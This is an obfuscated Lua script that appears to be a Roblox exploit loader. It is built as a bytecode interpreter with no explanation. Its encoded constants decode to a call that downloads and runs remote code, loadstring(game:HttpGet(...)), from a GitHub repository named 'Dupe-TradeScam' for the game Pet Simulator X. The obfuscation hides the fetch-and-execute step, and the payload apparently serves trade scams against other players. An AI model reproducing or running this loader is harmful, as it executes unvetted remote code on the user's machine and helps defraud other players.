do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then v18=v0(v3(v29,1,1));return "";else local v62=v2(v0(v29,16));if v18 then local v65=0;local v66;while true do if (0==v65) then v66=v5(v62,v18);v18=nil;v65=1;end if (1==v65) then return v66;end end else return v62;end end end);local function v19(v30,v31,v32)if v32 then local v63=(v30/((1475 -(303 + (1225 -(19 + 36))))^(v31-(2 -1))))%((950 -(47 + 901))^(((v32-1) -(v31-(389 -(113 + 275)))) + ((1792 -(873 + 35)) -(345 + 538))));return v63-(v63%1);else local v64=(2 -(0 -0))^(v31-((14 -10) -3));return (((v30%(v64 + v64))>=v64) and (1 + 0 + 0)) or ((3181 -1217) -(1190 + 774));end end local function v20()local v37=v1(v15,v17,v17);v17=v17 + 1;return v37;end local function v21()local v38=(1721 + 114) -(49 + 1786);local v39;local v40;while true do if (v38==(1 + 0 + 0)) then return (v40 * (552 -(255 + 41))) + v39;end if ((0 -0)==v38) then v39,v40=v1(v15,v17,v17 + 1 + 1);v17=v17 + (5 -3);v38=1 + 0;end end end local function v22()local v41,v42,v43,v44=v1(v15,v17,v17 + (4 -2) + 1);v17=v17 + (1960 -(741 + 1215));return (v44 * (20451766 -3674550)) + (v43 * (22122 + 43414)) + (v42 * 256) + v41;end local function v23()local v45=v22();local v46=v22();return (( -(2 -(0 -0)) * v19(v46,3 + 29)) + 1) * ((1 + 1)^(v19(v46,1031 -(716 + 294),31) -(1855 -832))) * ((((v19(v46,1 -(259 -(119 + 140)),39 -19) * ((1409 -(943 + 464))^(26 + 6))) + v45)/((2 + 0)^52)) + (1859 -(472 + 1386)));end local function v24(v33)local v47=0 -0;local v48;local v49;while true do if ((2 -1)==v47) then v48=v3(v15,v17,(v17 + v33) -(1 + 0));v17=v17 + v33;v47=2;end if (v47==2) then v49={};for v67=4 -3, #v48 do v49[v67]=v2(v1(v3(v48,v67,v67)));end v47=2 + 1;end if ((3 + 0 + 0)==v47) then return v6(v49);end if (v47==((3019 -2349) -(250 + 420))) then v48=nil;if  not v33 then local v70=0;while true do if (v70==(1853 -(79 + 1774))) then v33=v22();if (v33==(0 -0)) then return "";end break;end end end v47=2 -1;end end end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v50=595 -(129 + 466);local v51;local v52;local v53;local v54;local v55;local v56;while true do local v61=0 -0;while true do if (v61~=0) then else local v69=0 -0;while true do if (v69~=1) then else v61=1 + 0;break;end if (v69~=(397 -(250 + 147))) then else if (v50~=(2 -1)) then else local v94=1895 -(1833 + 62);local v95;while true do if (v94~=(0 + 0)) then else v95=0;while true do if (v95~=0) then else local v100=0;while true do if ((0 -0)==v100) then v55=v22();v56={};v100=1;end if (v100==(52 -(48 + 3))) then v95=1;break;end end end if (v95~=(1 + 1)) then else v50=343 -(37 + 304);break;end if (1==v95) then for v104=141 -(12 + 128),v55 do local v105=0 + 0;local v106;local v107;local v108;while true do if (v105~=(617 -(302 + 315))) then else local v111=0;while true do if (v111~=0) then else v106=0 -0;v107=nil;v111=1;end if (v111~=(1 + 0)) then else v105=1;break;end end end if (v105==(1 -0)) then v108=nil;while true do if (v106~=(1 -0)) then else if (v107==(4 -3)) then v108=v20()~=0;elseif (v107==(80 -(26 + 52))) then v108=v23();elseif (v107==(377 -(152 + 222))) then v108=v24();end v56[v104]=v108;break;end if (v106~=0) then else local v120=0 + 0;while true do if (v120~=1) then else v106=652 -(169 + 482);break;end if (v120~=(0 -0)) then else local v142=0;while true do if (v142==(0 + 0)) then v107=v20();v108=nil;v142=770 -(599 + 170);end if (v142==(2 -1)) then v120=1;break;end end end end end end break;end end end v54[3]=v20();v95=2;end end break;end end end if (v50~=(1969 -(1281 + 686))) then else local v96=0 + 0;local v97;while true do if (v96~=0) then else v97=0 + 0;while true do if (1==v97) then local v102=607 -(411 + 196);while true do if (v102~=0) then else for v112=1 + 0,v22() do v53[v112]=v22();end return v54;end end end if (v97==(0 + 0)) then local v103=0;while true do if (0~=v103) then else for v114=1,v22() do local v115=0 -0;local v116;while true do if ((0 + 0)==v115) then v116=v20();if (v19(v116,1,1 + 0)==(0 + 0)) then local v136=0;local v137;local v138;local v139;local v140;local v141;while true do if (v136~=(3 -2)) then else v139=nil;v140=nil;v136=2;end if (v136==2) then v141=nil;while true do if (v137~=1) then else local v150=0 + 0;local v151;while true do if (0~=v150) then else v151=0 + 0;while true do if (v151~=1) then else v137=2;break;end if (v151==(0 + 0)) then local v164=794 -(674 + 120);while true do if (v164==(1 + 0)) then v151=1;break;end if (v164==(0 + 0)) then v140=nil;v141=nil;v164=1;end end end end break;end end end if (v137==0) then local v152=1518 -(106 + 1412);local v153;while true do if (v152==0) then v153=1647 -(991 + 656);while true do if (v153~=1) then else v137=1;break;end if (v153==(805 -(292 + 513))) then v138=0;v139=nil;v153=2 -1;end end break;end end end if (v137~=2) then else while true do if (v138==(5 -3)) then local v156=471 -(210 + 261);while true do if (v156==(0 -0)) then local v165=0 -0;local v166;while true do if (v165==(0 -0)) then v166=0 + 0;while true do if (v166~=(1507 -(756 + 751))) then else if (v19(v140,1 + 0,2 -1)==(1 + 0)) then v141[824 -(807 + 15)]=v56[v141[2]];end if (v19(v140,2,2)==(752 -(127 + 624))) then v141[1372 -(958 + 411)]=v56[v141[3]];end v166=744 -(323 + 420);end if (v166~=1) then else v156=1 + 0;break;end end break;end end end if (1==v156) then v138=3;break;end end end if (v138==(3 + 0)) then if (v19(v140,11 -8,3)~=(1062 -(352 + 709))) then else v141[243 -(82 + 157)]=v56[v141[3 + 1]];end v51[v114]=v141;break;end if (v138==(1 + 0)) then local v158=0 + 0;local v159;while true do if (v158~=0) then else v159=0;while true do if (v159==(0 + 0)) then local v167=0;while true do if (v167~=(507 -(476 + 30))) then else v159=440 -(410 + 29);break;end if (v167==0) then v141={v21(),v21(),nil,nil};if (v139==(1000 -(374 + 626))) then local v171=596 -(502 + 94);while true do if (v171~=(0 -0)) then else v141[3]=v21();v141[4]=v21();break;end end elseif (v139==(1016 -(89 + 926))) then v141[3]=v22();elseif (v139==(9 -7)) then v141[3]=v22() -(2^16);elseif (v139==3) then local v176=0 + 0;local v177;while true do if (v176~=(0 -0)) then else v177=572 -(355 + 217);while true do if (0~=v177) then else v141[3]=v22() -(2^16);v141[4]=v21();break;end end break;end end end v167=1 -0;end end end if (v159==(1 + 0)) then v138=2;break;end end break;end end end if (v138==0) then local v160=0 + 0;local v161;while true do if (v160~=(0 -0)) then else v161=0;while true do if (v161==(0 -0)) then local v168=0;while true do if (v168~=(1 + 0)) then else v161=3 -2;break;end if (v168~=(0 -0)) then else v139=v19(v116,1 + 1,3);v140=v19(v116,4 -0,1112 -(725 + 381));v168=1;end end end if (v161~=1) then else v138=3 -2;break;end end break;end end end end break;end end break;end if (v136~=(0 -0)) then else local v147=0;while true do if (v147~=(1 + 0)) then else v136=3 -2;break;end if ((1140 -(1030 + 110))==v147) then v137=0;v138=nil;v147=1;end end end end end break;end end end for v117=1 + 0,v22() do v52[v117-(3 -2)]=v27();end v103=1;end if (v103~=1) then else v97=1;break;end end end end break;end end end v69=806 -(360 + 445);end end end if (v61~=1) then else if (v50==(0 + 0)) then local v76=1006 -(15 + 991);while true do if (v76==1) then v53={};v54={v51,v52,nil,v53};v76=2;end if (v76==(0 -0)) then v51={};v52={};v76=1;end if (v76~=(1 + 1)) then else v50=1 + 0;break;end end end break;end end end end local function v28(v34,v35,v36)local v57=0;local v58;local v59;local v60;while true do if (1==v57) then v60=v34[3];return function(...)local v71=1;local v72= -1;local v73={...};local v74=v11("#",...) -1;local function v75()local v77=v58;local v78=Const;local v79=v59;local v80=v60;local v81=v26;local v82={};local v83={};local v84={};for v90=(0 -0) -0,v74 do if ((v90>=v80) or (((295 + 695) -(63 + 447))<=(1677 -(470 + 1163)))) then v82[v90-v80]=v73[v90 + 1 + 0];else v84[v90]=v73[v90 + (1 -0)];end end local v85=(v74-v80) + 1;local v86;local v87;while true do local v91=1367 -(131 + 1236);local v92;local v93;while true do if ((v91==1) or (((1783 + 187) -(1966 -(741 + 179)))>(1549 + 3014))) then while true do if ((v92==(1704 -(1187 + 517))) or ((102 + (13 -8))>=(4705 -(248 + 1022)))) then v93=0;while true do if (((1312 -(658 + 654))==v93) or (3331>=4214)) then local v109=0 + 0;local v110;while true do if ((1476>=((2576 -980) -(2935 -(1200 + 602)))) and (v109==(0 -0))) then v110=0;while true do if ((0==v110) or ((2346 -((693 -(403 + 143)) + 663))==(1353 -(29 + (1475 -1055))))) then local v121=0;while true do if (((9437 -5146)<=(5092 -(123 + 121))) and (v121==(0 -0))) then v86=v77[v71];v87=v86[(5 -3) -1];v121=1 + 0;end if (((3455 -(311 + (2540 -(589 + 1073))))<((12368 -(382 + 1345)) -6873)) and (v121==(1 -0))) then v110=1 + 0;break;end end end if (((1868 -(920 + 83))<(1596 + 1346)) and (v110==(4 -3))) then v93=1;break;end end break;end end end if ((v93==1) or ((50 + 2184)>2670)) then if ((v87<=3) or (4275<=403)) then if ((v87<=(3 -(2 + 0))) or ((8915 -5550)>=(15815 -12214))) then if ((v87==(0 + (717 -(448 + 269)))) or ((2595 + 1417)==(18678 -14804))) then v84[v86[1 + 1]]();else local v122=(0 -0) -0;local v123;local v124;local v125;local v126;local v127;while true do if ((((17684 -(1451 + 494)) -11773)>(12584 -9292)) and (v122==(1928 -(25 + 1902)))) then v125=nil;v126=nil;v122=2;end if (((1445 + 7)>=(210 + 120)) and (v122==(2 + 0))) then v127=nil;while true do if (((1449 -(424 + 326 + 187))<=(2216 -((1773 -(1433 + 97)) + 397))) and (v123==(1800 -(865 + 935)))) then local v148=0;while true do if ((v148==(36 -(20 + 15 + 1))) or ((3661 -((1774 -(1262 + 355)) + 393))<=(1741 -(1471 + 129)))) then v124=v86[2];v125,v126=v81(v84[v124](v12(v84,v124 + 1 + 0,v86[3 + (0 -0)])));v148=1497 -(473 + 1023);end if ((v148==(1 + 0)) or ((4699 + 95)>=(5558 -(720 + 19)))) then v123=1986 -(1087 + 898);break;end end end if ((v123==(1 + 0)) or (212>(3427 -(408 + 585)))) then local v149=0 + 0;while true do if (((1472 + 2248 + 347)<(11835 -7085)) and ((1998 -(1203 + 795))==v149)) then v72=(v126 + v124) -(1141 -(346 + 794));v127=0 -0;v149=1 -0;end if (((2835 -(8 + 630))==(6004 -3807)) and (v149==(1194 -(1047 + 146)))) then v123=2 + 0;break;end end end if (((906 -(83 + 164))==((821 + 136) -((535 -337) + 100))) and (v123==(2 + 0))) then for v154=v124,v72 do local v155=372 -(166 + 33 + 173);while true do if ((v155==(0 -0)) or ((2050 + 2019)==(467 + 18))) then v127=v127 + (1620 -(1185 + 434));v84[v154]=v125[v127];break;end end end break;end end break;end if ((((15850 -10612) -(107 + (2110 -(257 + 1154))))==(6223 -(267 + 1524))) and (v122==(0 + (888 -(346 + 542))))) then v123=0 + 0;v124=nil;v122=(2440 -(693 + 438)) -(445 + 863);end end end elseif (((11666 -6938)>=(5175 -(280 + 238))) and (v87>(2 + 0))) then local v128=(21 + 192) -(124 + 73 + 16);local v129;while true do if (((4682 -(340 + 329))>=759) and (v128==(0 + 0))) then v129=v86[1 + 1];v84[v129]=v84[v129](v12(v84,v129 + (1 -0),v72));break;end end else do return;end end elseif ((v87<=(15 -10)) or ((1898 + 1335)<=(2461 -827))) then if (((66 + (858 -(508 + 327)))==(1667 -(1027 + 551))) and (v87>4)) then v84[v86[1062 -(700 + 360)]]=v86[6 -3]~=(715 -(485 + 230));else v84[v86[2]]=v36[v86[3]];end elseif ((v87>(876 -(172 + 698))) or (3928<=(881 + 589))) then local v132=0;local v133;local v134;while true do if ((v132==0) or ((13555 -8978)<(1333 -565))) then local v144=0 + 0 + 0;while true do if (((4126 -(410 + 234))>(185 + 443)) and ((1716 -(558 + 1158))==v144)) then v133=v86[(11 -4) -(2 + 3)];v134=v84[v86[3]];v144=1;end if ((v144==(1 + 0 + (70 -(18 + 52)))) or ((3200 + 1654)<=(568 + 97))) then v132=1;break;end end end if ((v132==1) or ((4833 -2380)==(1676 -917))) then v84[v133 + 1 + 0]=v134;v84[v133]=v134[v86[(1278 -(803 + 465)) -6]];break;end end else v84[v86[2]]=v86[3];end v71=v71 + (1 -0);break;end end break;end end break;end if (((2218 -(434 + 334))>670) and (v91==(0 -(1275 -(533 + 742))))) then v92=(20 + 1704) -(1271 + 153 + 300);v93=nil;v91=1 + 0;end end end end A,B=v26(v10(v75));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v34[4][v71] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end end;end if (v57==0) then v58=v34[1];v59=v34[2];v57=1;end end end return v28(v27(),{},v16)();end v14("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403453O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F5264696D6F56322F447570652D54726164655363616D2F6D61696E2F5053582E6C756100093O0012043O00013O001204000100023O002007000100010003001206000300044O0005000400014O0001000100044O00035O00026O000100012O00023O00017O00093O00023O00023O00023O00023O00023O00023O00023O00023O00033O00",v8());end
